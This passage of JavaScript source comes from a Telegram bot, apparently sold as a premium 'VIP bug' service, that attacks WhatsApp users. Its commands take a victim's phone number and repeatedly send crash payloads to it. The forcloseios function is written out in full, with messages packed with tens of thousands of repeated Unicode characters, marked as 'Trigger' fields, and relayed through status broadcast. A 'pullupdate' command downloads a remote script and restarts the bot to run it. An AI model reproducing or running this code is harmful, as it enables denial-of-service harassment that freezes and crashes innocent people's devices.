    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 125; r++) {
      await DelayASilent(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("delayxfreeze", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /btxdelayxfreeze 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 70; r++) {
      await VenomVroit(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("blankui", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /btxblankui 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: false },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 50; r++) {
      await ForceCrash1(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("bxt-fc", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : / delay-hard 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 100; r++) {
      await scForcecloseNew(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


bot.command("bxt-ios", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : / bxt-delay 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " BXT VVIP BUG BOT  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 100; r++) {
      await forcloseios(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


bot.command("bxt-gc", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /delay-hard 234xxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT PRIVATE CHAT ONLY ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ processing target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE IS STILL SENT TO ALL CHATS ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: false },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐡𝐞𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variable 'sock' not found or WhatsApp is not connected.");
    }
    
    for (let r = 0; r < 100; r++) {
      await BlankV1(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Failed to Send")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

async function forcloseios(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "🔞 𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟ 𝐈𝐧‌𝐟𝐢‌𝐧‌𝐢𝐭𝐲" + TravaIphone, //Trigger 5
            matchedText: "🔞 𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟ 𝐈𝐧‌𝐟𝐢‌𝐧‌𝐢𝐭𝐲",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "🔞 𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟ 𝐈𝐧‌𝐟𝐢‌𝐧‌𝐢𝐭𝐲" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
}


// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/scary_autoupdate/refs/heads/main/scary.js";
const UPDATE_FILE_PATH = "./scary.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }

      res.pipe(file);

      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

bot.command("pullupdate", async (ctx) => {
  // CHECK OWNER
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Access only for owner!");
  }

  // PROCESSING MESSAGE
  const prosesMsg = new HTML()
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Synchronizing scripts...") +
      "\n" + HTML.italic("Please wait a moment.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script successfully mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Script synchronization failed.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

bot.command("pullupdate", async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Access only for owner!");
  }

  const thumbnailUp = "https://files.catbox.moe/ucgx1a.png";

  // PROCESSING MESSAGE PAKE RICH MESSAGE + FOTO
  const prosesMsg = new HTML()
    .photo(thumbnailUp, "📥 Downloading Update...")
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Synchronizing scripts...") +
      "\n" + HTML.italic("Please wait a moment.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .photo(thumbnailUp, "✅ Update Success!")
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script successfully mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆 © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .photo(thumbnailUp, "❌ Update Failed!")
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Script synchronization failed.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

// FUNCTION BY @mkloytiem
async function ForcecloseNew(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
